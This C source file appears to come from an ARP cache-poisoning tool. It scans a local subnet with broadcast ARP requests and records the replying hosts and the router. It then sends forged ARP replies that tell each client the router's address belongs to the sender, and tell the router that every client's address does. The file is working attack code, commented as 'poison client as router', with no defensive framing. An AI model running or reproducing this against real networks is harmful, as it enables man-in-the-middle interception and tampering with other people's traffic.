#include "arp.h"
#include "../client.h"
#include <string.h>
#include <stdio.h>

extern unsigned char *src_ip;
extern unsigned char *router_ip;
extern unsigned char *src_mac;

void AnalyzeArp(struct iovec *packet_ring)
{
    struct ether_header     *eth;
    struct  ether_arp       *arptr;

    eth = (struct ether_header *)packet_ring->iov_base;

    switch(ntohs(eth -> ether_type))
    {
        case ETHERTYPE_ARP:
            arptr = (struct ether_arp *)((unsigned char *)eth+sizeof(*eth));

            //arp reply
            if ( ntohs(arptr -> ea_hdr.ar_op) == ARPOP_REPLY )
            {
                pthread_mutex_lock(&cmutex);
                if (SearchClientMac(arptr -> arp_sha) == FALSE &&
                        memcmp(src_ip, arptr -> arp_spa, 4) != 0)
                {
                    if ( GetRouter() == NULL && memcmp(router_ip, arptr -> arp_spa, 4) == 0 )
                    {
                        AddRouter(arptr -> arp_sha, arptr -> arp_spa);
                        pthread_cond_signal(&cvar);
                    }
                    else
                    if ( memcmp(router_ip, arptr -> arp_spa, 4) != 0 )
                    {
                        AddClient(arptr -> arp_sha, arptr -> arp_spa);
                        pthread_cond_signal(&cvar);
                    }
                }
                pthread_mutex_unlock(&cmutex);
            }
            PrintClients();
            PrintRouter();
            break;
        default:
            fprintf(stderr, "packet is not arp!!\n");
            break;
    }
}

void ConstructArpReply(struct iovec *packet)
{
    struct ether_header     *ether;
    struct ether_arp        *arp_header;
    struct client           *cl, *r, cltmp, rtmp;
    static int              i = 0;

    pthread_mutex_lock(&cmutex);
    //router client doesnt exists wait until they appear
    while (( cl = GetClient(0)) == NULL || (r = GetRouter()) == NULL )
    {
        pthread_cond_wait(&cvar, &cmutex);
    }
    //if no more clients time to poison the other side
    if (( cl = GetClient(i)) == NULL )
    {
        i = 0;
        poisonC = !poisonC;
        packet->iov_len = 0;
        pthread_mutex_unlock(&cmutex);
        return;
    }
    memcpy((char *)&cltmp, (char *)cl, sizeof(cltmp));
    memcpy((char *)&rtmp, (char *)r, sizeof(rtmp));
    pthread_mutex_unlock(&cmutex);
    //construct packet
    ether = (struct ether_header *)packet->iov_base;
    arp_header = (struct ether_arp *)((unsigned char *)packet->iov_base+sizeof(struct ether_header));
    memcpy((char *)ether->ether_shost, (char *)src_mac, 6);
    ether->ether_type = htons(ETHERTYPE_ARP);
    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header->ea_hdr.ar_hln = 6;
    arp_header->ea_hdr.ar_pln = 4;
    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy((char *)arp_header->arp_sha, (char *)src_mac, 6);

    //poison client as router
    if (poisonC)
    {
        memcpy((char *)ether->ether_dhost, (char *)cltmp.mac, 6);
        memcpy((char *)arp_header->arp_spa, (char *)rtmp.ip, 4);
        memcpy((char *)arp_header->arp_tpa, (char *)cltmp.ip, 4);
        memcpy((char *)arp_header->arp_tha, (char *)cltmp.mac, 6);
    }
    //poison router as all clients
    else
    {
        memcpy((char *)ether->ether_dhost, (char *)rtmp.mac, 6);
        memcpy((char *)arp_header->arp_spa, (char *)cltmp.ip, 4);
        memcpy((char *)arp_header->arp_tpa, (char *)rtmp.ip, 4);
        memcpy((char *)arp_header->arp_tha, (char *)rtmp.mac, 6);
    }
    packet->iov_len = sizeof(struct ether_header)+sizeof(struct ether_arp);
    i++;
    //cyta works
    usleep(20000);
    return;
}

void ConstructArpRequest(struct iovec *packet)
{

    struct ether_header     *ether;
    struct ether_arp        *arp_header;
    static unsigned int     ipq = 0;
    unsigned char           tip[4];
    
    //memcpy(tip, src_ip, 3);
    tip[3] = (char )ipq;
    memcpy(tip, src_ip, 3);
    if ( memcmp(tip, src_ip, 4) == 0 )
        ipq++;

    //tip[3] = (char )ipq;
    ether = (struct ether_header *)packet->iov_base;
    arp_header = (struct ether_arp *)((unsigned char *)packet->iov_base+sizeof(struct ether_header));
    memset((char *)ether->ether_dhost, 0xff, 6);
    memcpy((char *)ether->ether_shost, (char *)src_mac, 6);
    ether->ether_type = htons(ETHERTYPE_ARP);
    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header->ea_hdr.ar_hln = 6;
    arp_header->ea_hdr.ar_pln = 4;
    arp_header->ea_hdr.ar_op = htons(ARPOP_REQUEST);
    memcpy((char *)arp_header->arp_sha, (char *)src_mac, 6);
    //memcpy((char *)arp_header->arp_spa, (char *)router_ip, 4);
    memcpy((char *)arp_header->arp_spa, (char *)src_ip, 4);
    memcpy((char *)arp_header->arp_tpa, tip, 4);
    memset((char *)arp_header->arp_tha, '\0', 6);
    packet->iov_len = sizeof(struct ether_header)+sizeof(struct ether_arp);
    ipq++;

    if (ipq == 256)
    {
        sleep(1);
        ipq = 0;
    }
    //worked cyta
    usleep(10000);
    //usleep(90000);
}

